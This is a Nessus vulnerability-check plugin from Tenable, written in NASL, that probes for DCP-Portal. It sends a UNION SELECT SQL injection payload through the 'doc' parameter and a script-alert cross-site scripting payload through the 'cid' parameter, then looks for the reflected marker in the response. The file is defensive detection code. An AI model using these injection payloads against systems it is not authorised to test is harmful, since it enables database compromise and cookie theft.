#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description) {
 script_id(16478);
 script_version("$Revision: 1.17 $");

 script_cve_id("CVE-2005-0454", "CVE-2005-3365", "CVE-2005-4227");
 script_bugtraq_id(12573, 15183);
 script_xref(name:"OSVDB", value:"20493");
 script_xref(name:"OSVDB", value:"20494");
 script_xref(name:"OSVDB", value:"22017");
 script_xref(name:"OSVDB", value:"22018");
 script_xref(name:"OSVDB", value:"22019");
 script_xref(name:"OSVDB", value:"22020");
 script_xref(name:"OSVDB", value:"22021");
 script_xref(name:"OSVDB", value:"22022");
 script_xref(name:"OSVDB", value:"22023");
 script_xref(name:"OSVDB", value:"22024");
 script_xref(name:"OSVDB", value:"22025");
 script_xref(name:"OSVDB", value:"22026");
 script_xref(name:"OSVDB", value:"22027");
 script_xref(name:"OSVDB", value:"22028");
 script_xref(name:"OSVDB", value:"22029");
 script_xref(name:"OSVDB", value:"22030");
 script_xref(name:"OSVDB", value:"22031");

 script_name(english:"DCP-Portal Multiple Scripts SQL Injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
numerous SQL injection and cross-site scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running DCP-Portal, a content management system
powered by PHP. 

The version of DCP-Portal installed on the remote host fails to
sanitize user-supplied input to many of its parameters before using
it, either in database queries or dynamic web page generation.  An
attacker may be able to exploit these issues to manipulate such
queries to, say, uncover the admin password, launch attacks against
the underlying database, and steal authentication cookies.  Successful
exploitation of the SQL injection flaws requires that PHP's
'magic_quotes_gpc' setting be disabled." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=110858497207809&w=2" );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=113017151829342&w=2" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 summary["english"] = "Determines the presence of DCP-Portal";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Search for DCP-Portal.
if (thorough_tests) dirs = list_uniq(make_list("/portal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit one of the SQL injection flaws.
  #
  # nb: it's important that the quotes be url-encoded!
  exploit = urlencode(
    str:string("' UNION SELECT null,null,'nessus','", SCRIPT_NAME, "',null,null,null,null,null,null,null,null--"),
    unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*,()-]"
  );
  r = http_send_recv3(method: 'GET', 
    item:string(
      dir, "/index.php?",
      "page=documents&",
      "doc=-99", exploit
    ), 
    port:port
  );
  if (isnull(r)) exit(0);

  # There's a problem if we see our script name in a table element.
  if (
    string('<td width="70%">', SCRIPT_NAME, '</td>') >< r[2] &&
    egrep(pattern:'Powered By <a href="http://www\\.dcp-portal\\.com"[^>]*>DCP-Portal', string:r[2])
  ) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }

  # If that didn't work and we're testing thoroughly...
  if (thorough_tests) {
    # Try to exploit one of the XSS injection flaws.
    #
    # nb: it's important that the quotes be url-encoded!
    xss = string("<script>alert('", SCRIPT_NAME, "')</script>");
    exploit = urlencode(
      str:xss,
      unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*,()-]"
    );
    r = http_send_recv3(method: 'GET',
      item:string(
        dir, "/index.php?",
        "page=send&",
        "cid=", exploit
      ), 
      port:port
    );
    if (isnull(r)) exit(0);

    # There's a problem if we see our XSS.
    if (
      xss >< r[2] &&
      egrep(pattern:'Powered By <a href="http://www\\.dcp-portal\\.com"[^>]*>DCP-Portal', string:r[2])
    ) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
